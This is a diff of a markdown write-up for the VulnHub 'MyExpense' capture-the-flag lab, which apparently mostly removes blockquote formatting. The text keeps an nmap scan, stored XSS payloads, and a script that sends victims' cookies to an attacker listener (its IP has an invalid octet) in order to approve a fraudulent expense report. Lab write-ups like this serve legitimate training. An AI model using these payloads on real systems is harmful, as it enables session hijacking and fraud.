@@ -1,4 +1,3 @@
-````markdown
 # máquinas
 
 - **Target Machine - MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)
@@ -7,16 +6,15 @@
 
 ## Scenario
 
-> You are **Samuel Lamotte**, and you’ve just been fired from your company **Furtura Business Informatique**. Unfortunately, due to the abrupt departure, you didn’t have the chance to validate the expense report from your last business trip, totaling €750 — the cost of a round-trip flight with your last client.
-> 
-> Fearing your former employer might refuse to reimburse you, you decide to hack into the internal application called **"MyExpense"**, used by the company to manage employee expense reports.
-> 
-> You are currently parked outside the company building, connected to the internal Wi-Fi network (the password hasn’t been changed since your departure). The application is protected by a login form with username and password authentication. You hope your credentials still work.
+You are **Samuel Lamotte**, and you’ve just been fired from your company **Furtura Business Informatique**. Unfortunately, due to the abrupt departure, you didn’t have the chance to validate the expense report from your last business trip, totaling €750 — the cost of a round-trip flight with your last client.
+Fearing your former employer might refuse to reimburse you, you decide to hack into the internal application called **"MyExpense"**, used by the company to manage employee expense reports.
+ 
+You are currently parked outside the company building, connected to the internal Wi-Fi network (the password hasn’t been changed since your departure). The application is protected by a login form with username and password authentication. You hope your credentials still work.
 
-> Known credentials:  
-> `slamotte:fzghn4lw`
+Known credentials:  
+`slamotte:fzghn4lw`
 
-> Once the challenge is completed successfully, the flag will appear within the application while logged in as **Samuel**.
+Once the challenge is completed successfully, the flag will appear within the application while logged in as **Samuel**.
 
 ---
 
@@ -50,7 +48,7 @@ nmap -sCV -p80 -Pn -n 192.168.56.101 -oN ./nmap/recon
 
 ![Nmap Recon](images/Pasted%20image%2020250719172052.png)
 
-> The scan revealed valuable insights, such as the presence of an `/admin/` directory. Additionally, it showed the absence of the `HttpOnly` flag, which may leave the application vulnerable to cookie theft.
+The scan revealed valuable insights, such as the presence of an `/admin/` directory. Additionally, it showed the absence of the `HttpOnly` flag, which may leave the application vulnerable to cookie theft.
 
 ---
 
@@ -94,7 +92,7 @@ Attempted to steal cookies by injecting a malicious script in the form:
 </script>
 ```
 
-> Successfully captured the admin (`rmasson`) cookies. However, session hijacking failed due to a restriction: only **one session per user** is allowed simultaneously.
+Successfully captured the admin (`rmasson`) cookies. However, session hijacking failed due to a restriction: only **one session per user** is allowed simultaneously.
 
 ---
 
@@ -153,7 +151,7 @@ request.open('GET','http://192.268.56.102:4444/?cookie=' + document.cookie);
 request.send();
 ```
 
-> Cookies from chat users were successfully exfiltrated:
+Cookies from chat users were successfully exfiltrated:
 
 ![Cookies Exfiltrated](images/Pasted%20image%2020250719183341.png)
 
@@ -231,9 +229,8 @@ Finally, logged back in as `slamotte` to confirm that the €750 reimbursement w
 
 ![Challenge Completed](images/Pasted%20image%2020250719190657.png)
 
-> ✅ Challenge successfully completed.
+✅ Challenge successfully completed.
 
 ```
 
 ---
-```
